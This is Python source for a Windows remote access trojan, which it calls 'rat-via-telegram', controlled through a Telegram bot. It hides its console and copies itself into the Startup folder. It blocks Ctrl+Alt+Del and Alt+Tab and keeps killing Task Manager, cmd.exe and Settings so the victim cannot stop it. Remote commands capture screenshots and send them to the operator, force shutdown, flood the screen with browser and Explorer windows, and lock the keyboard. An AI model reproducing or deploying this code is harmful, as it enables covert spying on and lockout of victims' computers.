import telebot
from telebot import types
import shutil 
import os
import sys
import threading, time
import keyboard as kb
import psutil
from PIL import ImageGrab
import webbrowser
import subprocess 
import psutil
import pyautogui
import ctypes
pyautogui.FAILSAFE = False

####################################################
BOT_TOKEN = 'TOKEN' #BotFather 
#########################################
bot = telebot.TeleBot(BOT_TOKEN)

def block_windows_settings():
    try:
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == 'systemsettings.exe':  
                    proc.kill()  
            time.sleep(0.5)  
    except Exception as e:
        print(f"Error in block_windows_settings: {e}")


def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


def add_to_startup():
    try:
        startup_dir = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
        current_exe = os.path.abspath(sys.argv[0])
        target_exe = os.path.join(startup_dir, os.path.basename(current_exe))
        if not os.path.exists(target_exe):
            shutil.copy(current_exe, target_exe)
            print(f"File added to startup: {target_exe}")
        else:
            print("The file is already in startup.")
    except Exception as e:
        print(f"Error adding to startup: {e}")

def block_keys():
    keys_to_block = ['alt+tab', 'ctrl+shift+esc', 'ctrl+alt+del']
    try:
        for key in keys_to_block:
            kb.add_hotkey(key, lambda: None, suppress=True)  

        while True:
            time.sleep(1)  
    except Exception as e:
        print(f"Error in blocking keys: {e}")


def commands_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2) 
    markup.add(
        types.KeyboardButton('/shutdown'),
        types.KeyboardButton('/screen'),
        types.KeyboardButton('/spam_url'),
        types.KeyboardButton('/stop_url_spam'),
        types.KeyboardButton('/explorer_spam'),
        types.KeyboardButton('/stop_explorer_spam'),
        types.KeyboardButton('/mouse_spam'),
        types.KeyboardButton('/mouse_spam_stop'),
        types.KeyboardButton('/block_all_keys'),
        types.KeyboardButton('/unblock_all_keys'),
        types.KeyboardButton('/stop_bot'),
        types.KeyboardButton('/about')
    )
    return markup

def block_task_manager():
    try:
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == 'Taskmgr.exe':  
                    proc.kill() 
            time.sleep(0.5) 
    except Exception as e:
        print(f"Error in blocking Task Manager: {e}")

def block_task_cmd():
    try:
        while True:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == 'cmd.exe':  
                    proc.kill() 
            time.sleep(0.5) 
    except Exception as e:
        print(f"Error in blocking Task Manager: {e}")

def open_links(url):
    global open_url_flag
    while not open_url_flag:
        webbrowser.open(url, new=2)
        time.sleep(1)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "Hello, rat-via-telegram by @squw1ll",
        reply_markup=commands_keyboard()
    )
@bot.message_handler(commands=['shutdown'])
def shutdown_device(message):
    try:
        os.system('shutdown /s /f /t 0')
        bot.send_message(message.chat.id, "Shutdown command executed successfully.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

import os
from PIL import ImageGrab 

@bot.message_handler(commands=['screen'])
def take_screenshot(message):
    try:
        screen_path = os.path.join(os.getenv('APPDATA'), 'Screenshot.jpg')
        ImageGrab.grab().save(screen_path)
        with open(screen_path, 'rb') as screen:
            bot.send_photo(message.chat.id, screen)
        os.remove(screen_path)
        bot.send_message(message.chat.id, "Screenshot captured and sent successfully.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['spam_url'])
def open_url_handler(message):
    global open_url_flag
    try:
        args = message.text.split(' ', 1)
        if len(args) < 2:
            bot.send_message(message.chat.id, "Usage: /spam_url <url>")
            return

        url = args[1]

        if not (url.startswith("http://") or url.startswith("https://")):
            url = "https://" + url
        open_url_flag = False
        threading.Thread(target=open_links, args=(url,), daemon=True).start()
        bot.send_message(message.chat.id, f"URL is being opened repeatedly: {url}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['stop_url_spam'])
def stop_open_url(message):
    global open_url_flag
    open_url_flag = True
    bot.send_message(message.chat.id, "Stopped opening URLs.")

@bot.message_handler(commands=['explorer_spam'])
def explorer_spam(message):
    try:
        for _ in range(50):  
            subprocess.Popen('explorer')

        bot.send_message(message.chat.id, "Explorer spam executed on this device.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=['stop_explorer_spam'])
def stop_explorer_spam(message):
    try:
        def kill_explorer():
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] == 'explorer.exe':
                    proc.kill()
        kill_explorer()
        bot.send_message(message.chat.id, "Stopped Explorer spam on this device.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


mouse_spam = False  

def mouse_movik():
    global mouse_spam
    while not mouse_spam:
        pyautogui.moveRel(150, 0) 
        time.sleep(0.1)  
        pyautogui.moveRel(-150, 0)  
        time.sleep(0.1)

@bot.message_handler(commands=['mouse_spam'])
def start_mouse_spam(message):
    global mouse_spam
    try:
        mouse_spam = False  
        threading.Thread(target=mouse_movik, daemon=True).start() 
        bot.send_message(message.chat.id, "Mouse spam started.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['mouse_spam_stop'])
def stop_mouse_spam(message):
    global mouse_spam
    try:
        mouse_spam = True  
        bot.send_message(message.chat.id, "Mouse spam stopped.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

blocking_active = False  
keys = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    'enter', 'esc', 'space', 'tab', 'backspace', 'delete', 'insert',
    'home', 'end', 'page up', 'page down', 'left', 'up', 'right', 'down',
    'caps lock', 'num lock', 'scroll lock',
    'shift', 'ctrl', 'alt', 'alt gr', 'win', 'menu', 'print screen', 
    'pause', 'break',
    'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
    'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f20', 'f21', 'f22', 'f23', 'f24', 'numpad 1', 'numpad 2', 'numpad 3', 'numpad 4', 'numpad 5',
    'numpad 6', 'numpad 7', 'numpad 8', 'numpad 9', 'numpad add', 'numpad subtract',
    'numpad multiply', 'numpad divide', 'numpad decimal', 'numpad enter',
    'numpad equal',
    'semicolon', 'equal', 'comma', 'minus', 'period', 'slash', 'grave',
    'left bracket', 'backslash', 'right bracket', 'quote',
    'minus', 'equal', 'left bracket', 'right bracket', 'backslash',
    'semicolon', 'quote', 'comma', 'period', 'slash',
    'grave', 'backtick', 'tilde'
]


@bot.message_handler(commands=['block_all_keys'])
def block_all_keys_handler(message):
    global blocking_active, keys

    if blocking_active:
        bot.send_message(message.chat.id, "The keys are already locked.")
        return

    blocking_active = True

    def block_all_keys():
        try:
            for key in keys:
                kb.block_key(key)
            bot.send_message(message.chat.id, "All keys are blocked. Use /unblock_all_keys to unblock them.")

            while blocking_active:
                time.sleep(1)
        except Exception as e:
            bot.send_message(message.chat.id, f"Key lock error: {e}")

    blocking_thread = threading.Thread(target=block_all_keys, daemon=True)
    blocking_thread.start()

@bot.message_handler(commands=['unblock_all_keys'])
def unblock_keys_handler(message):
    global blocking_active, keys

    if not blocking_active:
        bot.send_message(message.chat.id, "The keys are not locked.")
        return

    blocking_active = False  
    try:
        for key in keys:
            kb.unblock_key(key)
        bot.send_message(message.chat.id, "Keys unlocked.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Key unlock error: {e}")

blocked_apps = set()

@bot.message_handler(commands=['about'])
def send_commands_menu(message):
    bot.send_message(
        message.chat.id,
        "rat-via-telegram by @squw1ll"
    )

@bot.message_handler(commands=['stop_bot'])
def stop_bot(message):
    try:
        bot.send_message(message.chat.id, "Bot is stopping...")
        os._exit(0)  
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

threading.Thread(target=add_to_startup, daemon=True).start()
threading.Thread(target=block_keys, daemon=True).start()
threading.Thread(target=block_task_manager, daemon=True).start()
threading.Thread(target=block_task_cmd, daemon=True).start()
threading.Thread(target=block_windows_settings, daemon=True).start()
hide_console()
bot.polling()